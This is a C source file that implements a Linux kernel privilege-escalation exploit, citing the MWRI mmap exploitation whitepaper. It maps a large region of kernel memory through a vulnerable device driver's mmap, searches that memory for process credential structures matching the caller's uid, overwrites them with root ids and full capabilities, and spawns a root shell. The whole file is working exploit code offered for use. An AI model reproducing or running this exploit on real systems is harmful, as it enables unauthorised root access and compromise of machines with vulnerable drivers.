#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

// REFS:
// https://labs.f-secure.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf
// https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L111

unsigned int* get_next_cred(unsigned int* addr, unsigned long userspace, unsigned long size){
    unsigned int uid = getuid();
    if(uid == 0){
        puts("[!] UID already 0 !");
        exit(-1);
    }

    unsigned int credIt = 0;
    while (((unsigned long)addr) < (userspace + size - 0x40)){
        credIt = 0;
        if (
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid
        ){
            return addr;
        }
        addr++;
    }
    puts("[-] No more creds found !");
    return 0;
}

void spoof_cred_uids(unsigned int* addr, int value){
    int credIt = 0;
    addr[credIt++] = value;
    addr[credIt++] = value;
    addr[credIt++] = value;
    addr[credIt++] = value;
    addr[credIt++] = value;
    addr[credIt++] = value;
    addr[credIt++] = value;
    addr[credIt++] = value;
    return;
}

void spoof_cred_caps(unsigned int* cred_addr){
    int credIt = 9; // skip over 9 int's
    cred_addr[credIt++] = 0xffffffff;
    cred_addr[credIt++] = 0x0000003f;

    cred_addr[credIt++] = 0xffffffff;
    cred_addr[credIt++] = 0x0000003f;

    cred_addr[credIt++] = 0xffffffff;
    cred_addr[credIt++] = 0x0000003f;

    cred_addr[credIt++] = 0xffffffff;
    cred_addr[credIt++] = 0x0000003f;

    cred_addr[credIt++] = 0xffffffff;
    cred_addr[credIt++] = 0x0000003f;
    return;
}


int main(int argc, char* const *argv){
    printf("[*] PID:%d\n", getpid());
    int fd = open("/dev/device_file", O_RDWR);
    if(fd < 0){
        puts("[!] open failed!");
        return -1;
    }
    printf("[*] open ok fd:%d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long userspace = 0x42424000;
    unsigned int* addr = (unsigned int*)mmap(
        (void*)userspace,
        size,
        PROT_READ|PROT_WRITE,
        MAP_SHARED,
        fd,
        0x0
        );
    if (addr == MAP_FAILED){
        perror("[!] Failed to mmap: ");
        close(fd);
        return -1;
    }
    printf("[*] mmap OK addr:%lx\n", addr);

    unsigned int* cred_addr;
    unsigned int credNum = 0;
    while ( cred_addr = get_next_cred(addr, userspace, size)){
        printf("[+] Found matching pattern! ptr:%p credNum:%d\n", cred_addr, credNum);
        credNum++;
        spoof_cred_uids(cred_addr, 0);
        int current_uid = getuid();
        if(current_uid == 0){
            puts("[+] GOT ROOT!");
            puts("[*] Spoofing caps...");
            spoof_cred_caps(cred_addr);
            execl("/bin/sh","-", (char*)NULL);
            puts("[!] execl failed...");
            break;
        } else {
            spoof_cred_uids(cred_addr, current_uid);
        }
        addr = ++cred_addr;
    }

    int stop = getchar();
    return 0;
}
